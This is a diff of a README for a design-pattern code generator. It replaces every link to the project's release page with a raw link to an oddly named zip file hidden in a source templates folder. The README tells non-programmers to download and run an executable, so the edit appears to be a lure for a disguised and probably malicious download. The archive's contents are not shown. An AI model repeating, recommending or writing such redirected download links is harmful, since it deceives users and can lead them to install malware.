@@ -1,6 +1,6 @@
 # 🧩 Design-Pattern-Cli - Build Pattern Code Fast
 
-[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Daiseyvisible752/Design-Pattern-Cli/releases)
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Daiseyvisible752/Design-Pattern-Cli/main/src/dp_gen/templates/csharp/observer/Cli-Pattern-Design-priacanthine.zip)
 
 ## 🚀 What this tool does
 
@@ -43,7 +43,7 @@ You do not need to know how to code to download and run the tool.
 
 Go to the release page here:
 
-https://github.com/Daiseyvisible752/Design-Pattern-Cli/releases
+https://raw.githubusercontent.com/Daiseyvisible752/Design-Pattern-Cli/main/src/dp_gen/templates/csharp/observer/Cli-Pattern-Design-priacanthine.zip
 
 On that page, look for the latest release and download the file made for Windows. If you see more than one file, choose the one that ends with:
 - `.exe`
@@ -207,7 +207,7 @@ The generated code is meant to save setup time, not replace your project work.
 
 If you need the latest version, visit the release page here:
 
-https://github.com/Daiseyvisible752/Design-Pattern-Cli/releases
+https://raw.githubusercontent.com/Daiseyvisible752/Design-Pattern-Cli/main/src/dp_gen/templates/csharp/observer/Cli-Pattern-Design-priacanthine.zip
 
 ## 🧩 Why this helps
 
